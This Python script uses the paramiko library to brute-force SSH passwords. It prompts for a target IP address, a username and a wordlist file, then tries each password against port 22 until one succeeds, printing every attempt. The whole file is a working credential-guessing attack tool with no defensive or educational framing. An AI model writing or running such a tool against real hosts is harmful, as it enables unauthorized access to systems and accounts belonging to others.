import paramiko
import os

# Function to establish SSH connection


def ssh_connect(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        ssh.close()
        return False


if __name__ == '__main__':
    # Prompt user for target IP address, username, and password file location
    target = input('Please enter target IP address: ')
    username = input('Please enter username to bruteforce: ')
    password_file = input('Please enter location of the password file: ')

    # Check if the password file exists
    if not os.path.isfile(password_file):
        print("Password file does not exist!")
        exit(1)

    # Open password file and try each password
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()

            try:
                if ssh_connect(target, username, password):
                    print('Password found: ' + password)
                    exit(0)
                else:
                    print('Incorrect password: ' + password)
            except Exception as e:
                print(e)

    print('Password not found in the provided file.')
